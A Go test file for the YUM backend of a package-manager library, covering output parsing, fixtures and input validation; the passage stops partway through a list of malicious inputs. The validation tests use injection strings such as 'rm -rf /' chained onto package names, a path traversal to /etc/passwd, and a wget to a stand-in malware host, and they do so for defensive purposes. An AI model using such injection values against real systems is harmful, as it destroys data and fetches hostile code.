// Package yum provides comprehensive tests for the YUM package manager implementation
package yum

import (
	"context"
	"strings"
	"testing"

	"github.com/bluet/syspkg/manager"
	"github.com/bluet/syspkg/testing/testutil"
)

// MockCommandRunner provides a test implementation of CommandRunner
// MockCommandRunner wraps the manager package's MockCommandRunner
type MockCommandRunner struct {
	*manager.MockCommandRunner
}

func NewMockCommandRunner() *MockCommandRunner {
	return &MockCommandRunner{
		MockCommandRunner: manager.NewMockCommandRunner(),
	}
}

func (m *MockCommandRunner) SetOutput(command, output string) {
	args := strings.Fields(command)
	if len(args) > 1 {
		m.AddCommand(args[0], args[1:], []byte(output), nil)
	} else {
		m.AddCommand(args[0], []string{}, []byte(output), nil)
	}
}

func (m *MockCommandRunner) SetError(command string, err error) {
	args := strings.Fields(command)
	if len(args) > 1 {
		m.AddCommand(args[0], args[1:], nil, err)
	} else {
		m.AddCommand(args[0], []string{}, nil, err)
	}
}

// Test YUM Manager Creation and Basic Info
func TestManagerBasicInfo(t *testing.T) {
	mgr := NewManager()

	if mgr.GetName() != "yum" {
		t.Errorf("Expected name 'yum', got '%s'", mgr.GetName())
	}

	if mgr.GetType() != "system" {
		t.Errorf("Expected type 'system', got '%s'", mgr.GetType())
	}
}

func TestIsAvailable(t *testing.T) {
	runner := NewMockCommandRunner()
	versionFixture := testutil.LoadYUMFixture(t, "version.clean-system.rocky-8.txt")
	runner.SetOutput("yum --version", versionFixture)

	mgr := NewManagerWithRunner(runner)

	available := mgr.IsAvailable()
	if !available {
		t.Error("Expected YUM to be available with valid version output")
	}
}

func TestGetVersion(t *testing.T) {
	runner := NewMockCommandRunner()
	versionFixture := testutil.LoadYUMFixture(t, "version.clean-system.rocky-8.txt")
	runner.SetOutput("yum --version", versionFixture)

	mgr := NewManagerWithRunner(runner)

	version, err := mgr.GetVersion()
	if err != nil {
		t.Fatalf("GetVersion failed: %v", err)
	}

	if version != "4.7.0" {
		t.Errorf("Expected version '4.7.0', got '%s'", version)
	}
}

// Test Search functionality
func TestSearch(t *testing.T) {
	runner := NewMockCommandRunner()
	runner.SetOutput("yum search vim", `Last metadata expiration check: 0:00:04 ago on Wed 04 Jun 2025 10:30:00 AM UTC.
============================ Name Exactly Matched: vim ============================
vim.x86_64 : The VIM editor
============================== Name & Summary Matched: vim ==============================
vim-enhanced.x86_64 : A version of the VIM editor which includes recent enhancements`)

	mgr := NewManagerWithRunner(runner)
	ctx := context.Background()

	packages, err := mgr.Search(ctx, []string{"vim"}, nil)
	if err != nil {
		t.Fatalf("Search failed: %v", err)
	}

	if len(packages) != 2 {
		t.Errorf("Expected 2 packages, got %d", len(packages))
	}

	// Check that vim package exists (order may vary)
	found := false
	var pkg manager.PackageInfo
	for _, p := range packages {
		if p.Name == "vim" {
			found = true
			pkg = p
			break
		}
	}
	if !found {
		t.Fatalf("Expected to find vim package, got packages: %v", packages)
	}
	if pkg.Status != manager.StatusAvailable {
		t.Errorf("Expected status 'available', got '%s'", pkg.Status)
	}
	if arch, ok := pkg.Metadata["arch"]; !ok || arch != "x86_64" {
		t.Errorf("Expected arch 'x86_64', got '%v'", arch)
	}
}

// Test ListInstalled functionality
func TestListInstalled(t *testing.T) {
	runner := NewMockCommandRunner()
	runner.SetOutput("yum list installed", `Installed Packages
bash.x86_64                    4.4.20-4.el8_6                   @System
vim-enhanced.x86_64            2:8.0.1763-19.el8_6.4            @appstream`)

	mgr := NewManagerWithRunner(runner)
	ctx := context.Background()

	packages, err := mgr.ListInstalled(ctx, nil)
	if err != nil {
		t.Fatalf("ListInstalled failed: %v", err)
	}

	if len(packages) != 2 {
		t.Errorf("Expected 2 packages, got %d", len(packages))
	}

	// Check vim-enhanced package
	found := false
	for _, pkg := range packages {
		if pkg.Name == "vim-enhanced" {
			found = true
			if pkg.Version != "2:8.0.1763-19.el8_6.4" {
				t.Errorf("Expected version '2:8.0.1763-19.el8_6.4', got '%s'", pkg.Version)
			}
			if pkg.Status != manager.StatusInstalled {
				t.Errorf("Expected status 'installed', got '%s'", pkg.Status)
			}
			if arch, ok := pkg.Metadata["arch"]; !ok || arch != "x86_64" {
				t.Errorf("Expected arch 'x86_64', got '%v'", arch)
			}
		}
	}
	if !found {
		t.Error("Expected to find vim-enhanced package")
	}
}

// Test ListUpgradable functionality
func TestListUpgradable(t *testing.T) {
	runner := NewMockCommandRunner()
	runner.SetOutput("yum list updates", `Available Upgrades
bash.x86_64                    4.4.20-5.el8                     baseos
vim-enhanced.x86_64            2:8.0.1763-20.el8_6.4            appstream`)

	mgr := NewManagerWithRunner(runner)
	ctx := context.Background()

	packages, err := mgr.ListUpgradable(ctx, nil)
	if err != nil {
		t.Fatalf("ListUpgradable failed: %v", err)
	}

	if len(packages) != 2 {
		t.Errorf("Expected 2 packages, got %d", len(packages))
	}

	// Check bash package
	found := false
	for _, pkg := range packages {
		if pkg.Name == "bash" {
			found = true
			if pkg.Version != "4.4.20-5.el8" {
				t.Errorf("Expected version '4.4.20-5.el8', got '%s'", pkg.Version)
			}
			if pkg.Status != manager.StatusUpgradable {
				t.Errorf("Expected status 'upgradable', got '%s'", pkg.Status)
			}
		}
	}
	if !found {
		t.Error("Expected to find bash package")
	}
}

// Test GetInfo functionality
func TestGetInfo(t *testing.T) {
	runner := NewMockCommandRunner()
	runner.SetOutput("yum info vim", `Available Packages
Name         : vim
Version      : 8.0.1763
Architecture : x86_64
Summary      : The VIM editor`)

	mgr := NewManagerWithRunner(runner)
	ctx := context.Background()

	pkg, err := mgr.GetInfo(ctx, "vim", nil)
	if err != nil {
		t.Fatalf("GetInfo failed: %v", err)
	}

	if pkg.Name != "vim" {
		t.Errorf("Expected name 'vim', got '%s'", pkg.Name)
	}
	if pkg.Version != "8.0.1763" {
		t.Errorf("Expected version '8.0.1763', got '%s'", pkg.Version)
	}
	if pkg.Status != manager.StatusAvailable {
		t.Errorf("Expected status 'available', got '%s'", pkg.Status)
	}
	if pkg.Description != "The VIM editor" {
		t.Errorf("Expected description 'The VIM editor', got '%s'", pkg.Description)
	}
	if arch, ok := pkg.Metadata["arch"]; !ok || arch != "x86_64" {
		t.Errorf("Expected arch 'x86_64', got '%v'", arch)
	}
}

// Test Install functionality
func TestInstall(t *testing.T) {
	runner := NewMockCommandRunner()
	runner.SetOutput("yum install -y vim", "Complete!")

	mgr := NewManagerWithRunner(runner)
	ctx := context.Background()

	packages, err := mgr.Install(ctx, []string{"vim"}, &manager.Options{AssumeYes: true})
	if err != nil {
		t.Fatalf("Install failed: %v", err)
	}

	// Install should return empty list for YUM (for now)
	if len(packages) != 0 {
		t.Errorf("Expected 0 packages returned, got %d", len(packages))
	}
}

// Test Remove functionality
func TestRemove(t *testing.T) {
	runner := NewMockCommandRunner()
	runner.SetOutput("yum remove -y vim", "Complete!")

	mgr := NewManagerWithRunner(runner)
	ctx := context.Background()

	packages, err := mgr.Remove(ctx, []string{"vim"}, &manager.Options{AssumeYes: true})
	if err != nil {
		t.Fatalf("Remove failed: %v", err)
	}

	// Remove should return empty list for YUM (for now)
	if len(packages) != 0 {
		t.Errorf("Expected 0 packages returned, got %d", len(packages))
	}
}

// Test List functionality with different filters
func TestList(t *testing.T) {
	runner := NewMockCommandRunner()
	runner.SetOutput("yum list installed", `Installed Packages
bash.x86_64                    4.4.20-4.el8_6                   @System`)
	runner.SetOutput("yum list updates", `Available Upgrades
vim.x86_64                     8.0.1763-20.el8                  appstream`)

	mgr := NewManagerWithRunner(runner)
	ctx := context.Background()

	// Test installed filter
	packages, err := mgr.List(ctx, manager.FilterInstalled, nil)
	if err != nil {
		t.Fatalf("List installed failed: %v", err)
	}
	if len(packages) != 1 {
		t.Errorf("Expected 1 installed package, got %d", len(packages))
	}
	if packages[0].Name != "bash" {
		t.Errorf("Expected bash package, got %s", packages[0].Name)
	}

	// Test upgradable filter
	packages, err = mgr.List(ctx, manager.FilterUpgradable, nil)
	if err != nil {
		t.Fatalf("List upgradable failed: %v", err)
	}
	if len(packages) != 1 {
		t.Errorf("Expected 1 upgradable package, got %d", len(packages))
	}
	if packages[0].Name != "vim" {
		t.Errorf("Expected vim package, got %s", packages[0].Name)
	}

	// Test unsupported filter
	_, err = mgr.List(ctx, manager.FilterAvailable, nil)
	if err == nil {
		t.Error("Expected error for unsupported filter")
	}
}

// Test Refresh functionality
func TestRefresh(t *testing.T) {
	runner := NewMockCommandRunner()
	runner.SetOutput("yum makecache fast", "Metadata cache created.")

	mgr := NewManagerWithRunner(runner)
	ctx := context.Background()

	err := mgr.Refresh(ctx, nil)
	if err != nil {
		t.Fatalf("Refresh failed: %v", err)
	}
}

// Test Update functionality
func TestUpdate(t *testing.T) {
	runner := NewMockCommandRunner()
	runner.SetOutput("yum makecache fast", "Metadata cache created.")

	mgr := NewManagerWithRunner(runner)
	ctx := context.Background()

	err := mgr.Update(ctx, nil)
	if err != nil {
		t.Fatalf("Update failed: %v", err)
	}
}

// Test Upgrade functionality
func TestUpgrade(t *testing.T) {
	runner := NewMockCommandRunner()
	runner.SetOutput("yum update -y", "Complete!")

	mgr := NewManagerWithRunner(runner)
	ctx := context.Background()

	packages, err := mgr.Upgrade(ctx, []string{}, &manager.Options{AssumeYes: true})
	if err != nil {
		t.Fatalf("Upgrade failed: %v", err)
	}

	// Upgrade should return empty list for YUM (for now)
	if len(packages) != 0 {
		t.Errorf("Expected 0 packages returned, got %d", len(packages))
	}
}

// Test Clean functionality
func TestClean(t *testing.T) {
	runner := NewMockCommandRunner()
	runner.SetOutput("yum clean all", "Cleaning repos: baseos appstream")

	mgr := NewManagerWithRunner(runner)
	ctx := context.Background()

	err := mgr.Clean(ctx, nil)
	if err != nil {
		t.Fatalf("Clean failed: %v", err)
	}
}

// Test AutoRemove functionality
func TestAutoRemove(t *testing.T) {
	runner := NewMockCommandRunner()
	runner.SetOutput("yum autoremove -y", "Complete!")

	mgr := NewManagerWithRunner(runner)
	ctx := context.Background()

	packages, err := mgr.AutoRemove(ctx, &manager.Options{AssumeYes: true})
	if err != nil {
		t.Fatalf("AutoRemove failed: %v", err)
	}

	// AutoRemove should return empty list for YUM (for now)
	if len(packages) != 0 {
		t.Errorf("Expected 0 packages returned, got %d", len(packages))
	}
}

// Test Verify functionality
func TestVerify(t *testing.T) {
	runner := NewMockCommandRunner()
	runner.SetOutput("yum check vim", "")

	mgr := NewManagerWithRunner(runner)
	ctx := context.Background()

	packages, err := mgr.Verify(ctx, []string{"vim"}, nil)
	if err != nil {
		t.Fatalf("Verify failed: %v", err)
	}

	if len(packages) != 1 {
		t.Errorf("Expected 1 package returned, got %d", len(packages))
	}

	if packages[0].Name != "vim" {
		t.Errorf("Expected package name 'vim', got '%s'", packages[0].Name)
	}

	if verified, ok := packages[0].Metadata["verified"]; !ok || verified != true {
		t.Errorf("Expected verified=true in metadata, got %v", verified)
	}
}

// Test Status functionality
func TestStatus(t *testing.T) {
	runner := NewMockCommandRunner()
	runner.SetOutput("yum --version", "yum 4.7.0\nLoaded plugins: fastestmirror")
	runner.SetOutput("yum list installed", `Installed Packages
bash.x86_64                    4.4.20-4.el8_6                   @System`)

	mgr := NewManagerWithRunner(runner)
	ctx := context.Background()

	status, err := mgr.Status(ctx, nil)
	if err != nil {
		t.Fatalf("Status failed: %v", err)
	}

	if !status.Available {
		t.Error("Expected YUM to be available")
	}

	if !status.Healthy {
		t.Error("Expected YUM to be healthy")
	}

	if status.Version != "yum 4.7.0" {
		t.Errorf("Expected version 'yum 4.7.0', got '%s'", status.Version)
	}

	if status.InstalledCount != 1 {
		t.Errorf("Expected 1 installed package, got %d", status.InstalledCount)
	}
}

// Test Plugin Registration
func TestPluginRegistration(t *testing.T) {
	plugin := &Plugin{}

	mgr := plugin.CreateManager()
	if mgr == nil {
		t.Error("Expected plugin to create manager")
	}

	priority := plugin.GetPriority()
	if priority != 80 {
		t.Errorf("Expected priority 80, got %d", priority)
	}
}

// Test Input Validation
func TestInputValidation(t *testing.T) {
	mgr := NewManager()
	ctx := context.Background()

	// Test invalid package names
	_, err := mgr.Search(ctx, []string{"pkg;rm -rf /"}, nil)
	if err == nil {
		t.Error("Expected error for malicious package name")
	}

	_, err = mgr.GetInfo(ctx, "../../../etc/passwd", nil)
	if err == nil {
		t.Error("Expected error for path traversal package name")
	}
}

// ===== FIXTURE-BASED TESTS =====
// Following APT's fixture-based testing philosophy for authentic parsing validation

func TestSearchVimFixture(t *testing.T) {
	// CONTEXT: Tests parser behavior with real YUM search output
	// FIXTURE: search-vim-rocky8.txt - authentic yum search vim output from Rocky Linux 8
	// EXPECTATION: Should parse all vim-related packages with correct metadata
	// PURPOSE: Validates search parsing with real-world command output
	fixture := testutil.LoadYUMFixture(t, "search-vim.clean-system.rocky-8.txt")

	packages := parseSearchOutput(fixture)

	if len(packages) == 0 {
		t.Fatal("Expected packages from search fixture, got none")
	}

	// Test that all packages have required fields
	for _, pkg := range packages {
		if pkg.Name == "" {
			t.Error("Package name should not be empty")
		}
		if pkg.Status == "" {
			t.Error("Package status should not be empty")
		}
		if pkg.ManagerType != manager.TypeSystem {
			t.Errorf("Expected manager type '%s', got '%s'", manager.TypeSystem, pkg.ManagerType)
		}
		// YUM search output shows available packages
		if pkg.Status != manager.StatusAvailable {
			t.Errorf("Expected status '%s' for package '%s', got '%s'", manager.StatusAvailable, pkg.Name, pkg.Status)
		}
	}

	// Should contain vim-enhanced package specifically
	found := false
	for _, pkg := range packages {
		if pkg.Name == "vim-enhanced" {
			found = true
			if pkg.Description == "" {
				t.Error("vim-enhanced should have description")
			}
			break
		}
	}
	if !found {
		t.Error("Expected to find vim-enhanced package in search results")
	}
}

func TestSearchEmptyFixture(t *testing.T) {
	// CONTEXT: Tests parser behavior when no packages match search
	// FIXTURE: search-empty-rocky8.txt - yum search with no results
	// EXPECTATION: Should return empty list without errors
	// PURPOSE: Validates edge case handling for empty search results
	fixture := testutil.LoadYUMFixture(t, "search-zzz9999nonexistent.clean-system.rocky-8.txt")

	packages := parseSearchOutput(fixture)

	// Should return empty packages for empty search
	if len(packages) != 0 {
		t.Errorf("Expected 0 packages for empty search, got %d", len(packages))
	}
}

func TestListInstalledFixture(t *testing.T) {
	// CONTEXT: Tests parser behavior with real YUM list installed output
	// FIXTURE: list-installed-rocky8.txt - authentic yum list installed output
	// EXPECTATION: Should parse installed packages with versions and architectures
	// PURPOSE: Validates installed package listing and parsing
	fixture := testutil.LoadYUMFixture(t, "list-installed.clean-system.rocky-8.txt")

	packages := parseListOutput(fixture)

	if len(packages) == 0 {
		t.Fatal("Expected installed packages from fixture, got none")
	}

	// Should have many packages in a realistic system
	if len(packages) < 10 {
		t.Errorf("Expected at least 10 installed packages, got %d", len(packages))
	}

	// Verify package structure and that all are marked as installed
	for _, pkg := range packages {
		if pkg.Name == "" {
			t.Error("Package name should not be empty")
		}
		if pkg.Version == "" {
			t.Error("Installed package should have version")
		}
		if pkg.Status != manager.StatusInstalled {
			t.Errorf("Expected status '%s' for package '%s', got '%s'", manager.StatusInstalled, pkg.Name, pkg.Status)
		}
		if pkg.ManagerType != manager.TypeSystem {
			t.Errorf("Expected manager type '%s', got '%s'", manager.TypeSystem, pkg.ManagerType)
		}
	}
}

func TestListUpdatesFixture(t *testing.T) {
	// CONTEXT: Tests parser behavior with real YUM list updates output
	// FIXTURE: list-updates-rocky8.txt - authentic yum list updates output
	// EXPECTATION: Should parse upgradable packages with new versions
	// PURPOSE: Validates upgradable package detection and parsing
	fixture := testutil.LoadYUMFixture(t, "list-updates.clean-system.rocky-8.txt")

	packages := parseListOutput(fixture)

	if len(packages) == 0 {
		t.Fatal("Expected upgradable packages from fixture, got none")
	}

	// Verify all packages are marked as upgradable
	for _, pkg := range packages {
		if pkg.Name == "" {
			t.Error("Package name should not be empty")
		}
		if pkg.Version == "" {
			t.Error("Upgradable package should have version")
		}
		if pkg.Status != manager.StatusUpgradable {
			t.Errorf("Expected status '%s' for package '%s', got '%s'", manager.StatusUpgradable, pkg.Name, pkg.Status)
		}
		if pkg.ManagerType != manager.TypeSystem {
			t.Errorf("Expected manager type '%s', got '%s'", manager.TypeSystem, pkg.ManagerType)
		}
	}
}

func TestInfoVimFixture(t *testing.T) {
	// CONTEXT: Tests parser behavior with real YUM info output for vim on clean system
	// FIXTURE: info-vim.clean-system.rocky-8.txt - yum info vim output on clean system (empty - vim not available)
	// EXPECTATION: Should return package not found error for empty output
	// PURPOSE: Validates info parsing handles empty responses correctly
	fixture := testutil.LoadYUMFixture(t, "info-vim.clean-system.rocky-8.txt")

	_, err := parseInfoOutput(fixture, "vim")
	if err == nil {
		t.Error("Expected error for empty info output")
	}

	// Should return package not found error for empty output
	if err != manager.ErrPackageNotFound {
		t.Errorf("Expected ErrPackageNotFound for empty output, got %v", err)
	}
}

func TestInfoVimInstalledFixture(t *testing.T) {
	// CONTEXT: Tests parser behavior with real YUM info output for installed package
	// FIXTURE: info-vim-installed-rocky8.txt - yum info for already installed vim (empty = not installed)
	// EXPECTATION: Should handle case when package is not actually installed
	// PURPOSE: Validates info parsing handles empty/minimal responses
	fixture := testutil.LoadYUMFixture(t, "info-vim.vim-installed.rocky-8.txt")

	_, err := parseInfoOutput(fixture, "vim")
	if err == nil {
		t.Error("Expected error for empty/minimal info output")
	}

	// Should return package not found error for empty output
	if err != manager.ErrPackageNotFound {
		t.Errorf("Expected ErrPackageNotFound for empty output, got %v", err)
	}
}

func TestInfoNotFoundFixture(t *testing.T) {
	// CONTEXT: Tests parser behavior when package doesn't exist
	// FIXTURE: info-notfound-rocky8.txt - yum info for non-existent package
	// EXPECTATION: Should return appropriate error
	// PURPOSE: Validates error handling for missing packages
	fixture := testutil.LoadYUMFixture(t, "info-zzz9999nonexistent.clean-system.rocky-8.txt")

	_, err := parseInfoOutput(fixture, "nonexistent-package")
	if err == nil {
		t.Error("Expected error for non-existent package")
	}

	// Should be the specific "not found" error
	if err != manager.ErrPackageNotFound {
		t.Errorf("Expected ErrPackageNotFound, got %v", err)
	}
}

func TestInstallVimFixture(t *testing.T) {
	// CONTEXT: Tests that install fixture contains expected installation patterns
	// FIXTURE: install-vim-rocky8.txt - real yum install vim output
	// EXPECTATION: Should contain installation success indicators
	// PURPOSE: Validates install operation output patterns
	fixture := testutil.LoadYUMFixture(t, "install-vim.clean-system.rocky-8.txt")

	// Verify fixture contains expected install patterns
	if !strings.Contains(fixture, "Installing") && !strings.Contains(fixture, "Complete!") {
		t.Error("Expected vim installation patterns in fixture")
	}

	// Verify fixture has realistic content
	if len(strings.TrimSpace(fixture)) < 100 {
		t.Error("Install fixture seems too short for realistic yum install output")
	}
}

func TestInstallAlreadyInstalledFixture(t *testing.T) {
	// CONTEXT: Tests handling of "already installed" scenario
	// FIXTURE: install-already-installed-rocky8.txt - yum install for already installed package
	// EXPECTATION: Should contain "already installed" or "Nothing to do" messages
	// PURPOSE: Validates edge case handling for redundant installations
	fixture := testutil.LoadYUMFixture(t, "install-vim.vim-already-installed.rocky-8.txt")

	// Should contain already installed indicators
	if !strings.Contains(fixture, "already installed") && !strings.Contains(fixture, "Nothing to do") {
		t.Error("Expected already installed indicators in fixture")
	}
}

func TestInstallNotFoundFixture(t *testing.T) {
	// CONTEXT: Tests handling of package not found during install
	// FIXTURE: install-notfound-rocky8.txt - yum install for non-existent package
	// EXPECTATION: Should contain error messages
	// PURPOSE: Validates error handling for invalid package installations
	fixture := testutil.LoadYUMFixture(t, "install-zzz9999nonexistent.dry-run.clean-system.rocky-8.txt")

	// Should contain error indicators
	if !strings.Contains(fixture, "No match for argument") && !strings.Contains(fixture, "No package") {
		t.Error("Expected package not found indicators in fixture")
	}
}

func TestRemoveVimFixture(t *testing.T) {
	// CONTEXT: Tests that remove fixture contains expected removal patterns
	// FIXTURE: remove-nginx-rocky8.txt - real yum remove output
	// EXPECTATION: Should contain removal success indicators
	// PURPOSE: Validates remove operation output patterns
	fixture := testutil.LoadYUMFixture(t, "remove-vim.vim-installed.rocky-8.txt")

	// Verify fixture contains expected removal patterns
	if !strings.Contains(fixture, "Removing") && !strings.Contains(fixture, "Complete!") {
		t.Error("Expected package removal patterns in fixture")
	}
}

func TestRemoveNotFoundFixture(t *testing.T) {
	// CONTEXT: Tests handling of removing non-existent package
	// FIXTURE: remove-notfound-rocky8.txt - yum remove for non-existent package
	// EXPECTATION: Should contain "No Packages marked for removal" or similar
	// PURPOSE: Validates error handling for invalid package removals
	fixture := testutil.LoadYUMFixture(t, "remove-zzz9999nonexistent.clean-system.rocky-8.txt")

	// Should contain not found indicators
	if !strings.Contains(fixture, "No Packages marked for removal") && !strings.Contains(fixture, "No match") {
		t.Error("Expected package not found for removal indicators in fixture")
	}
}

func TestAutoRemoveFixture(t *testing.T) {
	// CONTEXT: Tests autoremove functionality
	// FIXTURE: autoremove-rocky8.txt - real yum autoremove output
	// EXPECTATION: Should handle autoremove operation (may be empty if no orphans)
	// PURPOSE: Validates autoremove operation parsing
	fixture := testutil.LoadYUMFixture(t, "autoremove.orphaned-packages.rocky-8.txt")

	// Autoremove may have packages to remove or may indicate nothing to do
	// Either case should be handled gracefully
	if len(strings.TrimSpace(fixture)) == 0 {
		t.Error("Autoremove fixture should not be empty")
	}
}

func TestCleanFixture(t *testing.T) {
	// CONTEXT: Tests clean functionality
	// FIXTURE: clean-rocky8.txt - real yum clean output
	// EXPECTATION: Should handle clean operation successfully
	// PURPOSE: Validates clean operation output
	fixture := testutil.LoadYUMFixture(t, "clean.clean-system.rocky-8.txt")

	// Clean should indicate cache cleanup - real output shows "X files removed"
	if !strings.Contains(fixture, "files removed") && !strings.Contains(fixture, "cleaned") {
		t.Error("Expected cache cleaning indicators in fixture")
	}
}

func TestUpdateDryRunFixture(t *testing.T) {
	// CONTEXT: Tests upgrade dry-run functionality
	// FIXTURE: update-dryrun-rocky8.txt - yum update dry-run output
	// EXPECTATION: Should show what would be updated without actually updating
	// PURPOSE: Validates dry-run upgrade operation
	fixture := testutil.LoadYUMFixture(t, "update.dry-run.clean-system.rocky-8.txt")

	// Dry-run should indicate test mode or show packages that would be updated
	if len(strings.TrimSpace(fixture)) < 50 {
		t.Error("Update dry-run fixture seems too short for realistic output")
	}
}

func TestInstallOutputParsing(t *testing.T) {
	// CONTEXT: Tests the new parseInstallOutput function with real fixture
	// FIXTURE: install-vim-rocky8.txt - authentic yum install vim output
	// EXPECTATION: Should parse installed packages with versions and architectures
	// PURPOSE: Validates that the improved parsing actually works
	fixture := testutil.LoadYUMFixture(t, "install-vim.clean-system.rocky-8.txt")

	packages := parseInstallOutput(fixture)

	if len(packages) == 0 {
		t.Fatal("Expected packages from install output parsing, got none")
	}

	// Should have multiple packages (vim-enhanced, gpm-libs, vim-common, etc.)
	if len(packages) < 3 {
		t.Errorf("Expected at least 3 packages from install output, got %d", len(packages))
	}

	// Debug: log all parsed packages
	for i, pkg := range packages {
		t.Logf("Package %d: Name='%s', Version='%s', Arch='%v', Status='%s'",
			i+1, pkg.Name, pkg.Version, pkg.Metadata["arch"], pkg.Status)
	}

	// Look for vim-enhanced specifically
	found := false
	for _, pkg := range packages {
		if pkg.Name == "vim-enhanced" {
			found = true
			if pkg.Version == "" {
				t.Error("vim-enhanced should have version information")
			}
			if pkg.Status != manager.StatusInstalled {
				t.Errorf("Expected status '%s', got '%s'", manager.StatusInstalled, pkg.Status)
			}
			if arch, ok := pkg.Metadata["arch"]; !ok || arch != "x86_64" {
				t.Errorf("Expected arch 'x86_64', got '%v'", arch)
			}
			t.Logf("vim-enhanced parsed: Version=%s, Arch=%v", pkg.Version, pkg.Metadata["arch"])
			break
		}
	}

	if !found {
		t.Error("Expected to find vim-enhanced in parsed install output")
		t.Logf("Available package names: %v", func() []string {
			var names []string
			for _, pkg := range packages {
				names = append(names, pkg.Name)
			}
			return names
		}())
	}

	t.Logf("Successfully parsed %d packages from install output", len(packages))
}

// Tests for missing parser functions (Critical Coverage Gaps)

func TestRemoveOutputParsingFixture(t *testing.T) {
	// CONTEXT: Tests parseRemoveOutput function with real YUM remove command output
	// FIXTURE: remove-vim.vim-installed.rocky-8.txt - captured from actual yum remove vim command
	// EXPECTATION: Should parse package names, versions, and architectures from removal output
	// PURPOSE: Validates removal output parsing accuracy (previously untested)
	fixture := testutil.LoadYUMFixture(t, "remove-vim.vim-installed.rocky-8.txt")

	packages := parseRemoveOutput(fixture)

	if len(packages) == 0 {
		t.Fatal("Expected packages from remove output fixture, got none")
	}

	// Find vim-enhanced package which should be in removal list
	var vimPkg *manager.PackageInfo
	for _, pkg := range packages {
		if pkg.Name == "vim-enhanced" {
			vimPkg = &pkg
			break
		}
	}

	if vimPkg == nil {
		t.Fatal("Expected to find vim-enhanced package in removal output")
	}

	// Validate package structure
	if vimPkg.Name == "" {
		t.Error("Package name should not be empty")
	}

	if vimPkg.Version == "" {
		t.Error("Package version should not be empty")
	}

	if vimPkg.Status != manager.StatusAvailable {
		t.Errorf("Expected removed package status '%s', got '%s'", manager.StatusAvailable, vimPkg.Status)
	}

	if vimPkg.ManagerType != manager.TypeSystem {
		t.Errorf("Expected manager type '%s', got '%s'", manager.TypeSystem, vimPkg.ManagerType)
	}

	// Check architecture metadata
	if arch, ok := vimPkg.Metadata["arch"]; !ok || arch == "" {
		t.Error("Expected architecture metadata for removed package")
	}

	t.Logf("Successfully parsed %d packages from remove output", len(packages))
}

func TestPackageNameVersionParsing(t *testing.T) {
	// CONTEXT: Tests parsePackageNameVersion utility function with various RPM naming patterns
	// PURPOSE: Validates correct separation of package names from version-release strings
	// IMPORTANCE: Critical for accurate package information extraction across all YUM operations
	testCases := []struct {
		input           string
		expectedName    string
		expectedVersion string
		description     string
	}{
		{
			input:           "vim-enhanced-2:8.0.1763-19.el8_6.4",
			expectedName:    "vim-enhanced",
			expectedVersion: "2:8.0.1763-19.el8_6.4",
			description:     "Package with epoch",
		},
		{
			input:           "gpm-libs-1.20.7-17.el8",
			expectedName:    "gpm-libs",
			expectedVersion: "1.20.7-17.el8",
			description:     "Package without epoch",
		},
		{
			input:           "which-2.21-20.el8",
			expectedName:    "which",
			expectedVersion: "2.21-20.el8",
			description:     "Simple package name",
		},
		{
			input:           "python3-pip-9.0.3-22.el8",
			expectedName:    "python3-pip",
			expectedVersion: "9.0.3-22.el8",
			description:     "Python package with hyphens",
		},
		{
			input:           "nginx-1:1.20.1-13.el8",
			expectedName:    "nginx",
			expectedVersion: "1:1.20.1-13.el8",
			description:     "Single name with epoch",
		},
		{
			input:           "httpd-tools-2.4.37-47.module_el8.6.0+1131+e7c12dc4",
			expectedName:    "httpd-tools",
			expectedVersion: "2.4.37-47.module_el8.6.0+1131+e7c12dc4",
			description:     "Complex module version",
		},
	}

	for _, tc := range testCases {
		t.Run(tc.description, func(t *testing.T) {
			name, version := parsePackageNameVersion(tc.input)

			if name != tc.expectedName {
				t.Errorf("Expected name '%s', got '%s' for input '%s'", tc.expectedName, name, tc.input)
			}

			if version != tc.expectedVersion {
				t.Errorf("Expected version '%s', got '%s' for input '%s'", tc.expectedVersion, version, tc.input)
			}
		})
	}
}

func TestRpmVersionParsing(t *testing.T) {
	// CONTEXT: Tests parseRpmVersion function with rpm -q command output formats
	// PURPOSE: Validates version extraction from rpm query output
	// IMPORTANCE: Used for status enhancement and package version validation
	testCases := []struct {
		input           string
		expectedVersion string
		description     string
	}{
		{
			input:           "vim-enhanced-8.0.1763-19.el8_6.4.x86_64",
			expectedVersion: "8.0.1763-19.el8_6.4",
			description:     "Standard RPM with architecture",
		},
		{
			input:           "nginx-1.20.1-13.el8.x86_64",
			expectedVersion: "1.20.1-13.el8",
			description:     "Package with simpler version",
		},
		{
			input:           "python3-pip-9.0.3-22.el8.noarch",
			expectedVersion: "9.0.3-22.el8",
			description:     "Package with noarch architecture",
		},
		{
			input:           "httpd-2.4.37-47.module_el8.6.0+1131+e7c12dc4.x86_64",
			expectedVersion: "2.4.37-47.module_el8.6.0+1131+e7c12dc4",
			description:     "Complex module version with metadata",
		},
		{
			input:           "kernel-core-4.18.0-348.el8.x86_64",
			expectedVersion: "4.18.0-348.el8",
			description:     "Kernel package version",
		},
		{
			input:           "",
			expectedVersion: "",
			description:     "Empty input",
		},
		{
			input:           "malformed-package",
			expectedVersion: "package",
			description:     "Malformed package string (extracts as name-version)",
		},
	}

	for _, tc := range testCases {
		t.Run(tc.description, func(t *testing.T) {
			version := parseRpmVersion(tc.input)

			if version != tc.expectedVersion {
				t.Errorf("Expected version '%s', got '%s' for input '%s'", tc.expectedVersion, version, tc.input)
			}
		})
	}
}

// Test to verify we have fixtures for remove operations
func TestRemoveVimFixtureExists(t *testing.T) {
	// CONTEXT: Ensures remove-vim.vim-installed.rocky-8.txt fixture exists and is usable
	// PURPOSE: Validates fixture availability for remove operation testing
	fixture := testutil.LoadYUMFixture(t, "remove-vim.vim-installed.rocky-8.txt")

	if len(strings.TrimSpace(fixture)) == 0 {
		t.Fatal("remove-vim.vim-installed.rocky-8.txt fixture is empty")
	}

	// Verify fixture contains expected removal patterns
	if !strings.Contains(fixture, "Removing") && !strings.Contains(fixture, "Erasing") {
		t.Error("remove-vim.vim-installed.rocky-8.txt fixture should contain removal patterns")
	}

	// Should be a realistic fixture with multiple lines
	lines := strings.Split(fixture, "\n")
	if len(lines) < 3 {
		t.Errorf("Expected realistic remove fixture with multiple lines, got %d lines", len(lines))
	}
}

// Security validation test (Critical Gap - YUM missing equivalent to APT)
func TestYUMInputValidation(t *testing.T) {
	// CONTEXT: Tests YUM package manager input validation and command injection prevention
	// PURPOSE: Ensures YUM has equivalent security validation to APT package manager
	// IMPORTANCE: Critical security feature - prevents malicious command injection
	mgr := NewManager()
	ctx := context.Background()

	// Test command injection prevention
	maliciousPackages := []string{
		"package; rm -rf /",           // Command chaining
		"package && wget malware.com", // Command chaining with &&
